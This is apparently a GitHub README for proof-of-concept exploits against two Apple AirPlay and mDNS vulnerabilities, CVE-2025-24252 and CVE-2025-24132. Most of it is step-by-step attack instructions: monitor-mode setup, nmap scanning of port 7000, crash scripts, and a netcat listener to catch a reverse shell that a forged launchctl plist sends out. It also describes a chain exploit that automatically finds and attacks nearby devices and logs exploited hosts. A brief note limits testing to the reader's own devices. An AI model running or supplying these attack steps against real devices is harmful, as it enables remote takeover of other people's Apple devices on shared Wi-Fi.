# AIRBORNE â€“ 2-PoCs-1-Repository

PoCs for **CVE-2025-24252** and **CVE-2025-24132**  

Discovered and detailed by Oligo Security

https://www.oligo.security/blog/airborne

Both bugs live in Appleâ€™s parsing of network dataâ€”specifically in Bonjour/mDNS and AirPlayâ€™s TCP pairing flow.

## CVE-2025-24252 â€“ mDNS TXT Record Crash Trigger

This vulnerability affects `AirPlayReceiver` and is triggered via malformed mDNS TXT records.

### Setup on Kali Linux

```bash
sudo apt update
sudo apt install python3-scapy avahi-daemon -y
sudo systemctl start avahi-daemon
```
**Wi-Fi Adapter Requirement**

To run crashtest_CVE-2025-24252.py and chain_exploit.py, you must use a Wi-Fi adapter that supports monitor mode.

### Before running the scanner or chain exploit, make sure to

```bash
sudo ip link set wlan0 down
sudo iwconfig wlan0 mode monitor
sudo ip link set wlan0 up
```

Replace wlan0 with the name of your adapter

You must be on the same Wi-Fi network as the target Apple devices

Monitor mode is required to properly receive multicast mDNS traffic over port 5353

### Clone the Repo

```bash
git clone https://github.com/ekomsSavior/AirBorne-PoC.git
cd AirBorne-PoC
```

### Configure the PoC

```bash
nano crashtest_CVE-2025-24252.py
```

Set your attacker IP and interface. Then save and exit (`CTRL+X`, then `Y`, then `ENTER`).

### Run the PoC

```bash
python3 crashtest_CVE-2025-24252.py
```

### Monitor Target Behavior

Use `tcpdump` or Wireshark to capture traffic on the Apple deviceâ€™s IP.

> Only test this on your own Apple devices in a safe lab setting.

## CVE-2025-24132 â€“ AirPlay Pairing Heap Overflow

This bug is in the `AirPlayScreen` component and can trigger a heap overflow by sending malformed pairing/init packets over TCP port 7000.

---

### Scan for Vulnerable AirPlay Hosts

```bash
nmap -p 7000 --open --script=banner <your-local-subnet>/24
```

---

### Crash PoC: TCP Malformed Packet

A low-level socket-based fuzzing PoC that can be expanded into an RCE trigger.

Edit the script

```bash
nano PoC_CVE-2025-24132.py
```

Set your target IP. Then run

```bash
python3 PoC_CVE-2025-24132.py
```

Watch for
- System reboots
- Pairing process freezes
- AirPlay UI or app crashes

If observed, a heap overflow condition is likely confirmed.

## From Crash to Code Execution â€“ CVE-2025-24132 RCE Simulation

### Overview

Trigger CVE-2025-24132 to simulate executing a reverse shell or `launchctl` job on a vulnerable or jailbroken Apple device.

Steps
- Overflow heap cleanly
- Inject shell command or plist-based job
- Trigger reverse shell or persistent execution

### What We Know

- AirPlay runs on TCP port `7000`
- `pairing-init` POST requests are vulnerable when oversized
- The protocol may accept binary plist payloads or plain XML

---

### Run the RCE Simulation Script

```bash
nano CVE-2025-24132_RCE.py
```

Set your
- `target_ip` (your Apple device)
- `attacker_ip` (your Kali machine)

Start your listener

```bash
nc -lvnp 4444
```

Then launch the PoC

```bash
python3 CVE-2025-24132_RCE.py
```

This sends a forged `launchctl` payload with a reverse shell string. Works only if the device is jailbroken or unpatched.

## **Combined Exploit Chain â€“ Discovery to Exploitation**

`chain_exploit.py` links both CVEs into one seamless attack path:  
- Scans for AirPlay targets using mDNS (CVE-2025-24252 scan logic)
- Automatically launches the TCP pairing RCE payload (CVE-2025-24132)

This simulates how a real-world attacker could automate device discovery and exploit delivery in a local Wi-Fi environment.

### Features

- Automatic mDNS discovery of vulnerable Apple AirPlay devices
- Launches forged `pairing-init` payloads to port 7000
- Embedded reverse shell string inside a `launchctl` XML plist
- Live scanning mode (`--live`) for continuous background operation
- All successful targets are logged to `exploited_hosts.log`
- ASCII banner because we donâ€™t miss ðŸ˜¤

### Run the Chain Exploit

```bash
nano chain_exploit.py
```

Set your
- `iface` â€” your active wireless interface (e.g. wlan0)
- `attacker_ip` â€” your Kali machine IP
- `attacker_port` â€” listener port (default: 4444)

Start your listener

```bash
nc -lvnp 4444
```

Then run

```bash
sudo python3 chain_exploit.py
```

Or to run continuously and re-scan every 10 seconds:

```bash
sudo python3 chain_exploit.py --live
```

### Output

- All discovered targets are printed
- Successful payloads are sent to each IP found
- All exploited IPs are saved to `exploited_hosts.log` with timestamps

> Note: Real reverse shell execution only occurs on jailbroken or unpatched Apple devices.
